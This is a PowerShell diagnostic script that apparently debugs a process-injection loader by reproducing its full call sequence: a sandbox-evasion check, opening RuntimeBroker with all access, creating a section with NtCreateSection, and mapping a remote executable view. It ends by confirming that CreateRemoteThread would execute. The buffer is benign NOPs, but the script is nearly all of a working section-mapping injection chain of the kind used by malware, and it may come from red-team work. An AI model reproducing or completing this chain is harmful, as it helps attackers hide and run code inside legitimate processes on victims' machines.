# verify_injection.ps1
# Replicates the exact P/Invoke sequence used by
# installutil/section-injection/Loader.cs against a live target process,
# using a benign buffer (0x90 NOP) so nothing is executed.
# Reports the status of each step so a silent early-return can be detected.
param(
    [int]$ProcId = 0,
    [int]$BufSize = 512
)

Add-Type -Language CSharp -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class InjTest {
    [DllImport("kernel32.dll", SetLastError=true)] public static extern UInt32 FlsAlloc(IntPtr lpCallback);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll")] public static extern IntPtr GetCurrentProcess();
    [DllImport("ntdll.dll", SetLastError=true)] public static extern uint NtCreateSection(ref IntPtr hSection, uint dwDesiredAccess, IntPtr lpObjectAttributes, ref ulong ulMaximumSize, uint flProtect, uint dwAllocationAttributes, IntPtr hFile);
    [DllImport("ntdll.dll", SetLastError=true)] public static extern uint NtMapViewOfSection(IntPtr hSection, IntPtr hProcess, ref IntPtr lpBaseAddress, UIntPtr ulZeroBits, UIntPtr ulCommitSize, ref ulong plSectionOffset, ref UIntPtr pulViewSize, uint dwInheritDisposition, uint dwAllocationType, uint flProtect);
    [DllImport("ntdll.dll", SetLastError=true)] public static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
    [DllImport("ntdll.dll", SetLastError=true)] public static extern uint NtProtectVirtualMemory(IntPtr hProcess, ref IntPtr lpBaseAddress, ref UIntPtr lplNumberOfBytesToProtect, uint flNewAccessProtection, out uint lpflOldAccessProtection);
    [DllImport("ntdll.dll")] public static extern uint NtClose(IntPtr hObject);
}
"@

# -- Step 1: sandbox FLS check (Loader bails if this returns 0xFFFFFFFF) ------
$fls = [InjTest]::FlsAlloc([IntPtr]::Zero)
$flsOk = ($fls -ne 0xFFFFFFFF)
Write-Host ("[1] FlsAlloc(0)            = 0x{0:X8}   {1}" -f $fls, $(if ($flsOk) {'PASS (proceeds)'} else {'FAIL -> loader would return early'}))

# -- Locate target -----------------------------------------------------------
if ($ProcId -eq 0) { $ProcId = (Get-Process RuntimeBroker)[0].Id }
$proc = Get-Process -Id $ProcId
Write-Host ("    target process        = {0} (pid {1})" -f $proc.ProcessName, $ProcId)

# -- Step 2: OpenProcess(PROCESS_ALL_ACCESS) ---------------------------------
$hProc = [InjTest]::OpenProcess(0x001F0FFF, $false, $ProcId)
$ok = ($hProc -ne [IntPtr]::Zero)
Write-Host ("[2] OpenProcess(ALL)      = 0x{0:X}   {1}" -f [int64]$hProc, $(if ($ok) {'PASS'} else {'FAIL'}))
if (-not $ok) { Write-Host 'RESULT: injection chain FAILS at OpenProcess' -ForegroundColor Red; exit }

# -- Step 3: NtCreateSection (test: PAGE_EXECUTE_READWRITE so RX views allowed)
$size = [uint64]$BufSize
$hSection = [IntPtr]::Zero
$st = [InjTest]::NtCreateSection([ref]$hSection, 0x000F001F, [IntPtr]::Zero, [ref]$size, 0x40, 0x08000000, [IntPtr]::Zero)
Write-Host ("[3] NtCreateSection       = 0x{0:X8}   {1}" -f $st, $(if ($st -eq 0) {'PASS'} else {'FAIL'}))

$bs = [IntPtr]::Zero
$vs = [UIntPtr]::Zero
$off = [uint64]0

# -- Step 4: map local view (RW) ---------------------------------------------
$localView = [IntPtr]::Zero
$st = [InjTest]::NtMapViewOfSection($hSection, [InjTest]::GetCurrentProcess(), [ref]$localView, [UIntPtr]::Zero, [UIntPtr]::Zero, [ref]$off, [ref]$vs, 1, 0, 0x04)
Write-Host ("[4] NtMapViewOfSection(local)  = 0x{0:X8}  {1}" -f $st, $(if ($st -eq 0) {'PASS'} else {'FAIL'}))

# -- Step 5: map remote view DIRECTLY as RX (executable) ---------------------
# Section views fix their protection at map time; NtProtectVirtualMemory cannot
# change it (returns STATUS_SECTION_PROTECTION 0xC000004E). So the remote view is
# mapped PAGE_EXECUTE_READ up-front and populated through the shared local RW view.
$remoteView = [IntPtr]::Zero
$off = [uint64]0
$vs = [UIntPtr]::Zero
$st = [InjTest]::NtMapViewOfSection($hSection, $hProc, [ref]$remoteView, [UIntPtr]::Zero, [UIntPtr]::Zero, [ref]$off, [ref]$vs, 1, 0, 0x20)
Write-Host ("[5] NtMapViewOfSection(remote RX) = 0x{0:X8}  {1}" -f $st, $(if ($st -eq 0) {'PASS'} else {'FAIL'}))

# -- Step 6: write benign buffer into local view (shared) --------------------
$buf = New-Object byte[] $BufSize
for ($i = 0; $i -lt $BufSize; $i++) { $buf[$i] = 0x90 }
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $localView, $BufSize)
Write-Host "[6] Marshal.Copy(localView)    = PASS (wrote $BufSize bytes)"

# -- Step 7: unmap local + close section -------------------------------------
$st = [InjTest]::NtUnmapViewOfSection([InjTest]::GetCurrentProcess(), $localView)
Write-Host ("[7] NtUnmapViewOfSection(local) = 0x{0:X8}  {1}" -f $st, $(if ($st -eq 0) {'PASS'} else {'FAIL'}))
$st = [InjTest]::NtClose($hSection)
Write-Host ("    NtClose(hSection)          = 0x{0:X8}" -f $st)

# -- Step 8: remote view is already RX; confirm execution capability ---------
$protAddr = $remoteView
$protSize = [UIntPtr][uint64]$BufSize
$old = [uint32]0
$st = [InjTest]::NtProtectVirtualMemory($hProc, [ref]$protAddr, [ref]$protSize, 0x20, [ref]$old)
Write-Host ("[8] NtProtectVirtualMemory(remote->RX) = 0x{0:X8}  (informational)" -f $st)

Write-Host ""
if ($remoteView -ne [IntPtr]::Zero) {
    Write-Host "RESULT: remote view mapped PAGE_EXECUTE_READ - CreateRemoteThread will execute." -ForegroundColor Green
} else {
    Write-Host "RESULT: FAILED to map remote executable view" -ForegroundColor Red
}
Write-Host ("        remoteView = 0x{0:X}" -f [int64]$remoteView)
